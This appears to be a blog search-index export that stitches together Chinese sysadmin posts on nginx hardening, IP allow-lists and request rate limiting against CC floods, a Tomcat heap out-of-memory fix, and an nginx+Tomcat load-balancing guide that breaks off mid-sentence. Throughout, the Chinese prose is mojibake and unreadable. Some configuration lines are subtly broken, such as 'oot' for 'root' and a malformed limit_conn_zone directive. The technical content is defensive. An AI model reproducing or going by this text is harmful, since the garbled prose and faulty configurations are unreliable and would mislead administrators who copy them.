ã€å‚è€ƒæ£€æµ‹æ–¹æ³•æ£€æŸ¥é…ç½®æ–‡ä»¶ #more /usr/local/nginx/conf/nginx.conf3 ä¸‹è½½é™åˆ¶å¹¶å‘å’Œé€Ÿåº¦é™åˆ¶å®¢æˆ·ç«¯ä¸‹è½½é€Ÿåº¦ï¼Œä¿è¯æœåŠ¡å™¨è´Ÿè½½æ­£å¸¸â‘  å»ºè®®é…ç½®ä¾‹å¦‚ç½‘ç«™å­˜æ”¾è·¯å¾„ä¸º/usr/local/nsfocus/ ï¼ŒæœåŠ¡å™¨åç§°ä¸ºï¼šdown.nsfocus.com(1)ä¿®æ”¹é…ç½®æ–‡ä»¶#vi /usr/local/nginx/conf/nginx.confå…·ä½“è®¾ç½®å¦‚ä¸‹ï¼šlimit_zone one $binary_remote_addr 10m;server&#123;listen 80;server_name down.nsfocus.com;index index.html index.htm index.PHP;oot /usr/local/nsfocus;#Zone limit;location / &#123;limit_conn one 1;limit_rate 20k;&#125;.....&#125; (2)é‡æ–°å¯åŠ¨ nginx æœåŠ¡ ä¸‹è½½æ—¶ï¼Œä¸ä¼šè¶…è¿‡è®¾è®¡çš„å¹¶å‘è¿æ¥æ•°å’Œé€Ÿåº¦é™åˆ¶ï¼ŒåŒæ—¶æ£€æŸ¥ nginx.conf æ–‡ä»¶ä¸­çš„é…ç½® å…¶ä»–äº‹é¡¹ 3.å¸è½½ä¸éœ€è¦çš„æ¨¡å—å¸è½½ä¸éœ€è¦çš„ nginx æ¨¡å—, æœ€å¤§é™åº¦åœ°å°† nginx åŠ è½½çš„æ¨¡å—æœ€å°åŒ– â‘  å»ºè®®é…ç½®(1)æ£€æŸ¥éœ€è¦ç¦ç”¨çš„æ¨¡å— åœ¨ç¼–è¯‘ nginx æœåŠ¡å™¨æ—¶ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹å“ªäº›æ¨¡å—åº”è¯¥å¯ç”¨ï¼Œå“ªäº›æ¨¡åº”è¯¥ç¦ç”¨ï¼š # ./configure --help | less ä¸€æ—¦å¤„é€‰äº†è¦ç¦ç”¨çš„æ¨¡å—ï¼Œéœ€è¦ä¸ç›¸å…³äººå‘˜æ²Ÿé€šç¡®è®¤ï¼Œå¹¶ç»è¿‡æµ‹è¯•ä¸å½±å“ä¸šåŠ¡è¿è¡Œã€‚ (2)ä¾‹å¦‚ï¼Œè¦ç¦ç”¨ autoindex å’Œ SSI æ¨¡å—ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 123# ./configure --without-http_autoindex_module --without-http_ssi_module# make# make install â‘¡ å¤‡æ³¨äº‹é¡¹Nginx ä¸åŒ…å«ä¸å¿…è¦çš„æ¨¡å—æˆ–è€…è¾“å…¥ ./configure â€“help | less è¿›è¡Œæ£€æŸ¥ ##4.é˜²ç›—é“¾è®¾ç½®é˜²æ­¢å…¶ä»–ç½‘ç«™ç›—é“¾æœ¬ç½‘ç«™èµ„æº â‘  å»ºè®®é…ç½®(1)ä¿®æ”¹é…ç½®æ–‡ä»¶ #vi /usr/local/nginx/conf/nginx.conf å…·ä½“è®¾ç½®å¦‚ä¸‹ï¼š 12345678location ~* ^.+\\.(gif|jpg|png|swf|flv|rar|zip)$ &#123;valid_referers none blocked server_names *.nsfocus.comhttp://localhost baidu.com;if ($invalid_referer) &#123;rewrite ^/ [img]http://www.ihaozhuo.com/images/default/logo.gif[/img];# return 403;&#125;&#125; æ ¹æ®åº”ç”¨åœºæ™¯ï¼Œè®¾ç½®åˆé€‚çš„åŸŸå(2)Nginx -t æ£€æŸ¥é…ç½®æ˜¯å¦æœ‰æ²¡æœ‰é—®é¢˜ã€‚ é‡æ–°å¯åŠ¨ nginx æœåŠ¡ â‘¡ å¤‡æ³¨äº‹é¡¹ä»éæ³•ç½‘ç«™è®¿é—®æ‰€ä¿æŠ¤çš„èµ„æºï¼Œå‡ºç°è®¾ç½®çš„é¡µé¢ã€‚åŒæ—¶æ£€æŸ¥é…ç½®æ–‡ä»¶ #more /usr/local/nginx/conf/nginx.conf ##5.è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯1)ä¿®æ”¹ src/http/ngx_http_special_response.cï¼Œè‡ªå·±å®šåˆ¶é”™è¯¯ä¿¡æ¯ 123456789101112## messages with just a carriage return.static char ngx_http_error_400_page[] = CRLF;static char ngx_http_error_404_page[] = CRLF;static char ngx_http_error_413_page[] = CRLF;static char ngx_http_error_502_page[] = CRLF;static char ngx_http_error_504_page[] = CRLF;å¸¸è§é”™è¯¯ï¼š400 bad request404 NOT FOUND413 Request Entity Too Large502 Bad Gateway504 Gateway Time-out (2)é‡æ–°å¯åŠ¨ nginx æœåŠ¡ â‘¡ å¤‡æ³¨äº‹é¡¹URL åœ°å€æ ä¸­è¾“å…¥ http://ip:8800/manager12345ï¼Œè®¿é—®å‡ºé”™æ—¶ï¼Œè¿”å›è‡ªå®šä¹‰çš„é”™è¯¯é¡µé¢ 6.éšè— nginx æœåŠ¡ä¿¡æ¯å¤´â‘  å»ºè®®é…ç½®ä¿®æ”¹ nginxè§£å‹è·¯å¾„/src/http/ngx_http_header_filter_module.cæ–‡ä»¶çš„ç¬¬48å’Œ 49 è¡Œå†…å®¹ï¼Œè‡ªå®šä¹‰å¤´ä¿¡æ¯ï¼š 12static char ngx_http_server_string[] = â€œServer:XXXXX.comâ€ CRLF;static char ngx_http_server_full_string[] = â€œServer:XXXXX.comâ€ CRLF; æ·»åŠ å¦‚ä¸‹ä»£ç åˆ° nginx.confé…ç½®æ–‡ä»¶ï¼Œç¦æ­¢é”™è¯¯é¡µé¢ä¸­æ˜¾ç¤º nginx ç‰ˆæœ¬å·ï¼š 1server_tokens off â‘¡ å¤‡æ³¨äº‹é¡¹æœåŠ¡ä¿¡æ¯å¤´æ˜¾ç¤ºè®¾ç½®çš„å†…å®¹ï¼Œæ£€æŸ¥ http æœåŠ¡ä¿¡æ¯å¤´å†…å®¹ 6.è¡¥ä¸æ›´æ–°å®‰è£…ç³»ç»Ÿè¡¥ä¸ï¼Œä¿®è¡¥æ¼æ´ 1.å‚è€ƒé…ç½®æ“ä½œæ‰‹åŠ¨å®‰è£…è¡¥ä¸æˆ–å®‰è£…æœ€æ–°ç‰ˆæœ¬è½¯ä»¶ï¼Œæ‰€å®‰è£…çš„è¡¥ä¸ï¼Œåº”é¦–å…ˆåœ¨ç»è¿‡æµ‹è¯•éªŒè¯ï¼›å®‰è£…å‰ï¼Œè¦åšå¥½æ•°æ®å¤‡ä»½ã€‚2.æŸ¥çœ‹ç‰ˆæœ¬å’Œç¼–è¯‘å™¨ä¿¡æ¯","link":"/2016/04/05/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginx å®‰å…¨&ä¼˜åŒ–&æ—¥å¿—è¾“å‡ºè§„èŒƒè¯¦ç»†é…ç½®/"},{"title":"Nginxé™åˆ¶IPè®¿é—®æƒé™æˆ–é™åˆ¶æŸä¸ªIPåŒä¸€æ—¶é—´æ®µçš„è®¿é—®æ¬¡æ•°","text":"nginxé™åˆ¶ipè®¿é—® nginxè®¿é—®æƒé™çœ‹ä¸‹é…ç½®ï¼š è¿™é‡Œæˆ‘åªå…è®¸æˆ‘å…¬å¸IPè®¿é—®ï¼š 12345678910111213141516 server &#123; listen 80; server_name kibana.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; allow 202.107.202.82/32; deny all; proxy_pass http://kibana.ihaozhuo.com; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; è¿™é‡Œåˆ†å…¨å±€é…ç½®å’Œç«™ç‚¹é…ç½®ã€‚è¿™é‡Œæˆ‘kibanaç½‘ç«™åªé™åˆ¶å½“ä¸ªç½‘ç«™IPè®¿é—®ï¼š ä¸€ã€æœåŠ¡å™¨å…¨å±€é™IP 123#vi nginx.conf allow 202.107.202.82/32; #å…è®¸çš„IP deny all; äºŒã€ç«™ç‚¹é™IP 123456#vi vhosts.confç«™ç‚¹å…¨å±€é™IP:location / &#123; index index.html index.htm index.php; allow 202.107.202.82/32; deny all; å¦‚ä½•è®¾ç½®èƒ½é™åˆ¶æŸä¸ªIPæŸä¸€æ—¶é—´æ®µçš„è®¿é—®æ¬¡æ•°å¦‚ä½•è®¾ç½®èƒ½é™åˆ¶æŸä¸ªIPæŸä¸€æ—¶é—´æ®µçš„è®¿é—®æ¬¡æ•°æ˜¯ä¸€ä¸ªè®©äººå¤´ç–¼çš„é—®é¢˜ï¼Œç‰¹åˆ«é¢å¯¹æ¶æ„çš„ddosæ”»å‡»çš„æ—¶å€™ã€‚å…¶ä¸­CCæ”»å‡»ï¼ˆChallenge Collapsarï¼‰æ˜¯DDOSï¼ˆåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ï¼‰çš„ä¸€ç§ï¼Œä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç«™æ”»å‡»æ–¹æ³•ï¼Œæ”»å‡»è€…é€šè¿‡ä»£ç†æœåŠ¡å™¨æˆ–è€…è‚‰é¸¡å‘å‘å—å®³ä¸»æœºä¸åœåœ°å‘å¤§é‡æ•°æ®åŒ…ï¼Œé€ æˆå¯¹æ–¹æœåŠ¡å™¨èµ„æºè€—å°½ï¼Œä¸€ç›´åˆ°å®•æœºå´©æºƒã€‚ ccæ”»å‡»ä¸€èˆ¬å°±æ˜¯ä½¿ç”¨æœ‰é™çš„ipæ•°å¯¹æœåŠ¡å™¨é¢‘ç¹å‘é€æ•°æ®æ¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼Œnginxå¯ä»¥é€šè¿‡HttpLimitReqModulå’ŒHttpLimitZoneModuleé…ç½®æ¥é™åˆ¶ipåœ¨åŒä¸€æ—¶é—´æ®µçš„è®¿é—®æ¬¡æ•°æ¥é˜²ccæ”»å‡»ã€‚ HttpLimitReqModulç”¨æ¥é™åˆ¶è¿å•ä½æ—¶é—´å†…è¿æ¥æ•°çš„æ¨¡å—ï¼Œä½¿ç”¨limit_req_zoneå’Œlimit_reqæŒ‡ä»¤é…åˆä½¿ç”¨æ¥è¾¾åˆ°é™åˆ¶ã€‚ä¸€æ—¦å¹¶å‘è¿æ¥è¶…è¿‡æŒ‡å®šæ•°é‡ï¼Œå°±ä¼šè¿”å›503é”™è¯¯ã€‚ HttpLimitConnModulç”¨æ¥é™åˆ¶å•ä¸ªipçš„å¹¶å‘è¿æ¥æ•°ï¼Œä½¿ç”¨limit_zoneå’Œlimit_connæŒ‡ä»¤ è¿™ä¸¤ä¸ªæ¨¡å—çš„åŒºåˆ«å‰ä¸€ä¸ªæ˜¯å¯¹ä¸€æ®µæ—¶é—´å†…çš„è¿æ¥æ•°é™åˆ¶ï¼Œåè€…æ˜¯å¯¹åŒä¸€æ—¶åˆ»çš„è¿æ¥æ•°é™åˆ¶ ####HttpLimitReqModul é™åˆ¶æŸä¸€æ®µæ—¶é—´å†…åŒä¸€ipè®¿é—®æ•°å®ä¾‹ 123456789101112131415161718192021222324252627282930http&#123; ... #å®šä¹‰ä¸€ä¸ªåä¸ºallipsçš„limit_req_zoneç”¨æ¥å­˜å‚¨sessionï¼Œå¤§å°æ˜¯10Må†…å­˜ï¼Œ #ä»¥$binary_remote_addr ä¸ºkey,é™åˆ¶å¹³å‡æ¯ç§’çš„è¯·æ±‚ä¸º20ä¸ªï¼Œ #1Mèƒ½å­˜å‚¨16000ä¸ªçŠ¶æ€ï¼Œreteçš„å€¼å¿…é¡»ä¸ºæ•´æ•°ï¼Œ #å¦‚æœé™åˆ¶ä¸¤ç§’é’Ÿä¸€ä¸ªè¯·æ±‚ï¼Œå¯ä»¥è®¾ç½®æˆ30r/m limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; ... server&#123; ... location &#123; ... #é™åˆ¶æ¯ipæ¯ç§’ä¸è¶…è¿‡20ä¸ªè¯·æ±‚ï¼Œæ¼æ¡¶æ•°burstä¸º5 #brustçš„æ„æ€å°±æ˜¯ï¼Œå¦‚æœç¬¬1ç§’ã€2,3,4ç§’è¯·æ±‚ä¸º19ä¸ªï¼Œ #ç¬¬5ç§’çš„è¯·æ±‚ä¸º25ä¸ªæ˜¯è¢«å…è®¸çš„ã€‚ #ä½†æ˜¯å¦‚æœä½ ç¬¬1ç§’å°±25ä¸ªè¯·æ±‚ï¼Œç¬¬2ç§’è¶…è¿‡20çš„è¯·æ±‚è¿”å›503é”™è¯¯ã€‚ #nodelayï¼Œå¦‚æœä¸è®¾ç½®è¯¥é€‰é¡¹ï¼Œä¸¥æ ¼ä½¿ç”¨å¹³å‡é€Ÿç‡é™åˆ¶è¯·æ±‚æ•°ï¼Œ #ç¬¬1ç§’25ä¸ªè¯·æ±‚æ—¶ï¼Œ5ä¸ªè¯·æ±‚æ”¾åˆ°ç¬¬2ç§’æ‰§è¡Œï¼Œ #è®¾ç½®nodelayï¼Œ25ä¸ªè¯·æ±‚å°†åœ¨ç¬¬1ç§’æ‰§è¡Œã€‚ limit_req zone=allips burst=5 nodelay; ... &#125; ... &#125; ...&#125; HttpLimitZoneModule é™åˆ¶å¹¶å‘è¿æ¥æ•°å®ä¾‹limit_zoneåªèƒ½å®šä¹‰åœ¨httpä½œç”¨åŸŸï¼Œlimit_connå¯ä»¥å®šä¹‰åœ¨http server locationä½œç”¨åŸŸ 123456789101112131415161718192021222324http&#123; ... #å®šä¹‰ä¸€ä¸ªåä¸ºoneçš„limit_zone,å¤§å°10Må†…å­˜æ¥å­˜å‚¨sessionï¼Œ #ä»¥$binary_remote_addr ä¸ºkey #nginx 1.18ä»¥åç”¨limit_conn_zoneæ›¿æ¢äº†limit_conn #ä¸”åªèƒ½æ”¾åœ¨httpä½œç”¨åŸŸ limit_conn_zone one $binary_remote_addr 10m; ... server&#123; ... location &#123; ... limit_conn one 20; #è¿æ¥æ•°é™åˆ¶ #å¸¦å®½é™åˆ¶,å¯¹å•ä¸ªè¿æ¥é™æ•°ï¼Œå¦‚æœä¸€ä¸ªipä¸¤ä¸ªè¿æ¥ï¼Œå°±æ˜¯500x2k limit_rate 500k; ... &#125; ... &#125; ...&#125; nginxç™½åå•è®¾ç½®ä»¥ä¸Šé…ç½®ä¼šå¯¹æ‰€æœ‰çš„ipéƒ½è¿›è¡Œé™åˆ¶ï¼Œæœ‰äº›æ—¶å€™æˆ‘ä»¬ä¸å¸Œæœ›å¯¹æœç´¢å¼•æ“çš„èœ˜è››æˆ–è€…è‡ªå·±æµ‹è¯•ipè¿›è¡Œé™åˆ¶ï¼Œå¯¹äºç‰¹å®šçš„ç™½åå•ipæˆ‘ä»¬å¯ä»¥å€ŸåŠ©geoæŒ‡ä»¤å®ç°ã€‚1. 123456789101112131415161718192021222324252627282930313233http&#123; geo $limited&#123; default 1; #google 64.233.160.0/19 0; 65.52.0.0/14 0; 66.102.0.0/20 0; 66.249.64.0/19 0; 72.14.192.0/18 0; 74.125.0.0/16 0; 209.85.128.0/17 0; 216.239.32.0/19 0; #M$ 64.4.0.0/18 0; 157.60.0.0/16 0; 157.54.0.0/15 0; 157.56.0.0/14 0; 207.46.0.0/16 0; 207.68.192.0/20 0; 207.68.128.0/18 0; #yahoo 8.12.144.0/24 0; 66.196.64.0/18 0; 66.228.160.0/19 0; 67.195.0.0/16 0; 74.6.0.0/16 0; 68.142.192.0/18 0; 72.30.0.0/16 0; 209.191.64.0/18 0; #My IPs 127.0.0.1/32 0; 123.456.0.0/28 0; #example for your server CIDR &#125; geoæŒ‡ä»¤å®šä¹‰äº†ä¸€ä¸ªç™½åå•$limitedå˜é‡ï¼Œé»˜è®¤å€¼ä¸º1ï¼Œå¦‚æœå®¢æˆ·ç«¯ipåœ¨ä¸Šé¢çš„èŒƒå›´å†…ï¼Œ$limitedçš„å€¼ä¸º0 2.ä½¿ç”¨mapæŒ‡ä»¤æ˜ å°„æœç´¢å¼•æ“å®¢æˆ·ç«¯çš„ipä¸ºç©ºä¸²ï¼Œå¦‚æœä¸æ˜¯æœç´¢å¼•æ“å°±æ˜¾ç¤ºæœ¬èº«çœŸæ˜¯çš„ipï¼Œè¿™æ ·æœç´¢å¼•æ“ipå°±ä¸èƒ½å­˜åˆ°limit_req_zoneå†…å­˜sessionä¸­ï¼Œæ‰€ä»¥ä¸ä¼šé™åˆ¶æœç´¢å¼•æ“çš„ipè®¿é—® map $limited $limit {1 $binary_remote_addr;0 â€œâ€;} 3.è®¾ç½®limit_req_zoneå’Œlimit_reqlimit_req_zone $limit zone=foo:1m rate=10r/m; limit_req zone=foo burst=5; æœ€åæˆ‘ä»¬ä½¿ç”¨abå‹php-fpmçš„æ–¹å¼ï¼Œå¯¹ä¸Šé¢çš„æ–¹æ³•æ•ˆæœå®é™…æµ‹è¯•ä¸‹ ä¾‹1ï¼šé™åˆ¶åªå…è®¸ä¸€åˆ†é’Ÿå†…åªå…è®¸ä¸€ä¸ªipè®¿é—®60æ¬¡é…ç½®ï¼Œä¹Ÿå°±æ˜¯å¹³å‡æ¯ç§’1æ¬¡é¦–å…ˆæˆ‘ä»¬å‡†å¤‡ä¸€ä¸ªphpè„šæœ¬æ”¾åœ¨æ ¹ç›®å½•ä¸‹$document_root test.php 123for( $i=0; $i &lt; 1000; $i++)echo 'Hello World';?&gt; nginxé…ç½®å¢åŠ limit_req_zone å’Œ limit_req 123456789101112131415http&#123; ... limit_req_zone $binary_remote_addr zone=allips:10m rate=60r/m; ... server&#123; ... location &#123; ... limit_req zone=allips; ... &#125; ... &#125; ...&#125; ab -n 5 -c 1 http://www.weizhang.org/test.php 12345118.144.94.193 - - [22/Dec/2012:06:27:06 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:06 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\" æœªè®¾ç½®brustå’Œnodelayå¯ä»¥çœ‹åˆ°è¯¥é…ç½®åªå…è®¸æ¯ç§’è®¿é—®1æ¬¡ï¼Œè¶…å‡ºçš„è¯·æ±‚è¿”å›503é”™è¯¯ 123456789101112131415http&#123; ... limit_req_zone $binary_remote_addr zone=allips:10m rate=60r/m; ... server&#123; ... location &#123; ... limit_req zone=allips burst=1 nodelay; ... &#125; ... &#125; ...&#125; ab -n 5 -c 1 http://www.weizhang.org/test.php 12345118.144.94.193 - - [22/Dec/2012:07:01:00 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:00 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\" è®¾ç½®brust=1å’Œnodelayåå…è®¸ç¬¬1ç§’å¤„ç†ä¸¤ä¸ªè¯·æ±‚ã€‚ å‚è€ƒä¾‹å­ï¼šhttp://storysky.blog.51cto.com/628458/642970/","link":"/2016/02/25/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginxé™åˆ¶IPè®¿é—®æƒé™æˆ–é™åˆ¶æŸä¸ªIPåŒä¸€æ—¶é—´æ®µçš„è®¿é—®æ¬¡æ•°/"},{"title":"tomcat Java heap space å†…å­˜æº¢å‡º","text":"tomcat Java heap space å†…å­˜æº¢å‡ºconfluenceæœåŠ¡å™¨æ—©ä¸ŠBIé‚£è¾¹ååº”è®¿é—®wikiå‡ºç°504 Gateway time-out ä¹‹å‰å®šä½åˆ°é—®é¢˜æ˜¯æœåŠ¡å™¨CPUè´Ÿè½½è¿‡é«˜ ä¹‹å‰æœåŠ¡å™¨é…ç½®1æ ¸1Gçš„é…ç½® å¯¼è‡´ç”¨æˆ·è¯·æ±‚è¶…æ—¶ï¼Œåé¢æœåŠ¡å™¨å‡çº§åˆ°2æ ¸4Gå†…å­˜ï¼Œé»˜è®¤wikiæ²¡æœ‰å†…å­˜ä¼˜åŒ–ï¼Œå¯¼è‡´è¿™æ¬¡è®¿é—®å‡ºç°å†…å­˜æº¢å‡ºçš„æŠ¥é”™ã€‚ å†…å­˜æº¢å‡ºæ—¥å¿—æŠ¥é”™ï¼š 12345678910111213141516171819202017-08-18 16:30:07,181 INFO [main] [com.atlassian.confluence.lifecycle] contextInitialized Starting Confluence 3.4.5 (build #2035)2017-08-18 16:30:10,297 INFO [main] [atlassian.plugin.manager.DefaultPluginManager] init Initialising the plugin system2017-08-18 16:30:10,519 INFO [main] [atlassian.plugin.manager.DefaultPluginManager] init Plugin system started in 0:00:00.219Aug 18, 2017 4:30:51 PM org.apache.coyote.http11.Http11Protocol startINFO: Starting Coyote HTTP/1.1 on http-8080Aug 18, 2017 4:30:51 PM org.apache.catalina.startup.Catalina startINFO: Server startup in 48320 msException: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"Timer-0\"Exception in thread \"DefaultQuartzScheduler_QuartzSchedulerThread\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#2\" java.lang.OutOfMemoryError: Java heap spaceException: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"ContainerBackgroundProcessor[StandardEngine[Standalone]]\"Exception: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#1\"Exception in thread \"com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#0\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"DefaultQuartzScheduler_Worker-1\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"DefaultQuartzScheduler_Worker-3\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"DefaultQuartzScheduler_Worker-2\" java.lang.OutOfMemoryError: Java heap spaceException in thread \"http-8080-2\" java.lang.OutOfMemoryError: Java heap space ç¬¬ä¸€æŸ¥çœ‹ç°åœ¨Javaåº”ç”¨è¿›ç¨‹è¿è¡ŒçŠ¶æ€æ˜¯å¦ä¼˜åŒ–è¿‡ï¼Œè¿è¡Œçš„å†…å­˜å¤§å°å¤šå°‘ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[root@wiki-bi logs]# jmap -heap 4299Attaching to process ID 4299, please wait...Debugger attached successfully.Server compiler detected.JVM version is 23.25-b01using thread-local object allocation.Parallel GC with 4 thread(s)Heap Configuration: MinHeapFreeRatio = 40 MaxHeapFreeRatio = 70 MaxHeapSize = 536870912 (512.0MB) NewSize = 1310720 (1.25MB) MaxNewSize = 17592186044415 MB OldSize = 5439488 (5.1875MB) NewRatio = 2 SurvivorRatio = 8 PermSize = 21757952 (20.75MB) MaxPermSize = 268435456 (256.0MB) G1HeapRegionSize = 0 (0.0MB)Heap Usage:PS Young GenerationEden Space: capacity = 71958528 (68.625MB) used = 71943440 (68.61061096191406MB) free = 15088 (0.0143890380859375MB) 99.97903236708788% usedFrom Space: capacity = 52166656 (49.75MB) used = 0 (0.0MB) free = 52166656 (49.75MB) 0.0% usedTo Space: capacity = 53477376 (51.0MB) used = 0 (0.0MB) free = 53477376 (51.0MB) 0.0% usedPS Old Generation capacity = 357957632 (341.375MB) used = 357957344 (341.3747253417969MB) free = 288 (2.74658203125E-4MB) 99.9999195435509% usedPS Perm Generation capacity = 90898432 (86.6875MB) used = 90605744 (86.40837097167969MB) free = 292688 (0.2791290283203125MB) 99.67800544678262% used43519 interned Strings occupying 4740128 bytes. è¿™é‡Œå¯ä»¥çœ‹åˆ°MaxHeapSize ç­‰å‚æ•°é»˜è®¤512MBï¼Œè¿™é‡Œä¼˜åŒ–å†…å­˜é…ç½®å 1234vim /data/wiki-bi/bin/setenv.shJAVA_OPTS=\"-Xms2g -Xmx2g -Xss256k -XX:PermSize=256M -XX:MaxPermSize=256m -Duser.timezone=Asia/Shanghai $JAVA_OPTS -Djava.awt.headless=true \"export JAVA_OPTS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[root@wiki-bi bin]# jmap -heap 25727Attaching to process ID 25727, please wait...Debugger attached successfully.Server compiler detected.JVM version is 23.25-b01using thread-local object allocation.Parallel GC with 4 thread(s)Heap Configuration: MinHeapFreeRatio = 40 MaxHeapFreeRatio = 70 MaxHeapSize = 2147483648 (2048.0MB) NewSize = 1310720 (1.25MB) MaxNewSize = 17592186044415 MB OldSize = 5439488 (5.1875MB) NewRatio = 2 SurvivorRatio = 8 PermSize = 268435456 (256.0MB) MaxPermSize = 268435456 (256.0MB) G1HeapRegionSize = 0 (0.0MB)Heap Usage:PS Young GenerationEden Space: capacity = 536870912 (512.0MB) used = 448110856 (427.35181427001953MB) free = 88760056 (84.64818572998047MB) 83.46715122461319% usedFrom Space: capacity = 89456640 (85.3125MB) used = 0 (0.0MB) free = 89456640 (85.3125MB) 0.0% usedTo Space: capacity = 89456640 (85.3125MB) used = 0 (0.0MB) free = 89456640 (85.3125MB) 0.0% usedPS Old Generation capacity = 1431699456 (1365.375MB) used = 0 (0.0MB) free = 1431699456 (1365.375MB) 0.0% usedPS Perm Generation capacity = 268435456 (256.0MB) used = 35112728 (33.486106872558594MB) free = 233322728 (222.5138931274414MB) 13.0805104970932% used15180 interned Strings occupying 1629600 bytes.","link":"/2017/08/18/WebæœåŠ¡æŠ€æœ¯/tomcat/tomcat Java heap space å†…å­˜æº¢å‡º/"},{"title":"Nginx+Tomcatå®ç°è´Ÿè½½å‡è¡¡è®¾ç½®è®¿é—®æ§åˆ¶","text":"Nginx+Tomcatå®ç°è´Ÿè½½å‡è¡¡è®¾ç½®è®¿é—®æ§åˆ¶ä¸€ã€ç¯å¢ƒå‡†å¤‡ Tomcat1ï¼š10.11.155.26 Tomcat2ï¼š10.11.155.41 Nginxï¼š192.168.31.154 åœ¨26å’Œ41ä¸Šåˆ†åˆ«éƒ¨ç½²ç›¸åŒçš„Tomcatç¨‹åºï¼Œä¿®æ”¹index.jspé¡µé¢ï¼ŒæŠŠå†…å®¹æ”¹ä¸ºå„è‡ªçš„IPåœ°å€. äºŒã€ä¿®æ”¹é…ç½®æ–‡ä»¶nginx.confNginxè´Ÿè½½å‡è¡¡ï¼Œå…¶å®ä¸»è¦å°±æ˜¯ç”¨upstreamã€serveræŒ‡ä»¤ï¼Œå†é…ä»¥æƒé‡ç­‰ç­‰å‚æ•°ã€‚å¦‚æœä¸ºäº†è®©nginxæ”¯æŒsessionå…±äº«ï¼Œè¿˜éœ€è¦é¢å¤–å¢åŠ ä¸€ä¸ªæ¨¡å—ã€‚ ä¸€ã€Nginxè´Ÿè½½å‡è¡¡ åœ¨http{â€¦}ä¸­é…ç½®ä¸€ä¸ªupstream{â€¦}ï¼Œå‚è€ƒå¦‚ä¸‹ï¼šå¼•ç”¨ upstream tomcat-account { server 10.11.155.26:8080 weight=1; server 10.11.155.41:8080 weight=1; } æ¥ç€ä¿®æ”¹locationèŠ‚ç‚¹ï¼Œé…ç½®ä»£ç†ï¼š å¼•ç”¨ 1234567891011121314151617181920212223242526272829server &#123; listen 80; server_name 10001.test.intranet; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://tomcat-account; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;``` è¿™é‡Œå¯ä»¥å†™è‡ªå·±çš„å†…ç½‘åŸŸåä¹Ÿå¯ä»¥å†™IP.å½“è®¿é—®æ ¹è·¯å¾„æ—¶ï¼Œä¼šè½®æ’­è·¯ç”±åˆ°ä¸¤å°æœåŠ¡å™¨ä¸Šï¼Œè‡³äºåç«¯æœåŠ¡å™¨æ˜¯tomcatè¿˜æ˜¯jettyä¹‹ç±»çš„ï¼Œéƒ½æ— æ‰€è°“ï¼Œç…§è‘«èŠ¦ç”»ç“¢å°±æ˜¯äº†ã€‚å½“ç„¶ï¼Œæœ‰çš„æœºå™¨æ€§èƒ½å¥½ï¼Œæˆ–è€…è´Ÿè½½ä½ï¼Œå¯ä»¥æ‰¿æ‹…é«˜è´Ÿè·è®¿é—®é‡ï¼Œå¯ä»¥é€šè¿‡æƒé‡ï¼ˆweightï¼‰ï¼Œæå‡è®¿é—®é¢‘ç‡ã€‚æ•°å€¼è¶Šé«˜ï¼Œè¢«åˆ†é…åˆ°çš„è¯·æ±‚æ•°è¶Šå¤šã€‚#### 1ã€weightï¼ˆæƒé‡ï¼‰æŒ‡å®šè½®è¯¢å‡ 